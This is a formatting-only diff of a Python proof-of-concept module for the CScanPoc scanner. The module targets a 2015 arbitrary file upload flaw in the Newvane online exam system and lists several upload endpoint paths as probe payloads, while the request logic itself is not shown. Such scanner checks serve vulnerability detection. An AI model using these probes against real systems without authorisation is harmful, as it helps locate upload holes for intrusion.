@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Newvane_0001' # 平台漏洞编号，留空
+    vuln_id = 'Newvane_0001'  # 平台漏洞编号，留空
     name = 'Newvane online exam 在线考试系统通用型任意文件上传'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = '2015-04-17'  # 漏洞公布时间
     desc = '''
         新风向在线考试系统平台系统通用型任意文件上传漏洞。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Newvane(新风向在线考试系统)'  # 漏洞应用名称
     product_version = 'Newvane online exam'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '41fcaff6-b252-45ac-98aa-48891f5dcd2f'
@@ -31,8 +33,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #Refer http://www.wooyun.org/bugs/wooyun-2015-0108559
+
+            # Refer http://www.wooyun.org/bugs/wooyun-2015-0108559
             payloads = [
                 '/mana/edit/uploadattcah.jsp',
                 '/mana/edit/attach_upload.jsp',
@@ -53,6 +55,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
